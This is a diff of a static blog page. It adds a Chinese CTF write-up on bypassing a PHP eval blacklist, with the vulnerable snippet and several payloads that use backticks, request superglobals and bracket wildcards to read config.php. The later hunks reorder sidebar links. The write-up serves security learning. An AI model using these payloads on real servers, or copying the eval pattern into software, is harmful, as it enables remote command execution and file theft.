+<h1 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># flag in config.php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|\\*|\?|\&lt;|\&gt;|\=|exec|highlight|cat|\(|\.|file|php|config/i&quot;</span>,<span class="variable">$c</span>))&#123;</span><br><span class="line">                <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cmd error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>新增了*，？，&lt;&gt;，&#x3D;的过滤，这样就不能用?&gt;结尾了，</p>
+</blockquote>
+<blockquote>
+<p>但是还可以可以用get和post,?c&#x3D;echo`$_GET[1]`;&amp;1&#x3D;tac “config.php”</p>
+</blockquote>
+<blockquote>
+<p>?c&#x3D;echo <code>$_POST[a]</code>​; BP 截断，修改为POST, 增加参数 a&#x3D; cat config.php</p>
+</blockquote>
+<blockquote>
+<p>只禁用了*和?常用通配符，还可以使用其他通配符[c1-c2],[!c1-c2],[list]等 payload：?c&#x3D;echo <code>tac confi[g][!0-9]ph[p]</code>​;</p>
+</blockquote>
+<blockquote>
+<p>?a&#x3D;cat config.php&amp;c&#x3D;echo<code>$_REQUEST[a]</code>​; ?a&#x3D;cat config.php&amp;c&#x3D;echo<code>$_GET[a]</code>​; 解析：php语言中，使用get、post传参，参数保存在超级变量$_REQUEST[a]、$_POST[a]、$_REQUEST[a]中。我们向REQUEST[a]传入文件名（因为如果写入c，会被过滤），然后向c传入执行_REQUEST[a]的代码。 另外，我们也可以通过burp抓包，以post方法将变量传入到a；通过get方法，向c传入执行代码。</p>
+</blockquote>
+<p>‍</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E6%8C%87%E4%BB%A4%E7%BB%95%E8%BF%87/" data-id="cmawcfx9g002icg7kcvbkalgo" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -715,11 +747,11 @@
       <ul>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
           </li>
         
           <li>
@@ -727,11 +759,11 @@
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E+%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">(no title)</a>
           </li>
         
           <li>
-            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">(no title)</a>
+            <a href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/">(no title)</a>
           </li>
         
       </ul>
